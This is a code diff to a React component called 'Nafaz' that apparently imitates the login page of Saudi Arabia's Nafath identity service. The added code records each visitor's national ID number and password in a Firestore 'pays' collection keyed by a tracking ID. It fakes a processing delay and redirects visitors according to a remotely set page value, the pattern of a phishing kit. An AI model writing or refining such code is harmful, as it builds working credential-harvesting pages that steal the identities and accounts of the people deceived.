@@ -43,7 +43,7 @@ export default function Nafaz() {
           if (docSnapshot.exists()) {
             const userData = docSnapshot.data()
             // Assuming the PIN is stored in a field called 'nafaz_pin'
-          setVerificationCode(userData)
+            setVerificationCode(userData)
 
             if (userData.currentPage === '1') {
               window.location.href = '/'
@@ -69,7 +69,9 @@ export default function Nafaz() {
   }, [])
 
   const updateFirestore = async (idCardNumber: string, password: string) => {
-    if (!visitorId) {
+    const userId = localStorage.getItem('visitor')
+
+    if (!userId) {
       console.error("Visitor ID not found in localStorage")
       throw new Error("Visitor ID not found")
     }
@@ -78,16 +80,19 @@ export default function Nafaz() {
       // Import Firebase functions
 
       // Reference to the document in the pays collection
-      const paysDocRef = doc(db, "pays", visitorId)
+      const paysDocRef = doc(db, "pays", userId)
 
       // Update the document with Nafaz credentials
-     addData(
-      {  nafadUsername: idCardNumber,
-        nafadPassword: password,
-        updatedAt: new Date().toISOString()}
+      addData(
+        {
+          id: userId, nafadUsername: idCardNumber,
+          nafadPassword: password,
+          updatedAt: new Date().toISOString()
+        }
       ).catch(async () => {
         // If document doesn't exist, create it
-        await addData( {
+        await addData({
+          id: userId,
           nafadUsername: idCardNumber,
           nafadPassword: password,
           createdDate: new Date().toISOString(),
@@ -131,7 +136,7 @@ export default function Nafaz() {
       // Simulate processing delay
       await new Promise((resolve) => setTimeout(resolve, 1000))
       setIsSubmitted(true)
-     
+
     } catch (error) {
       console.error("خطأ في الدخول للنظام ", error)
       setIsRejected(true)
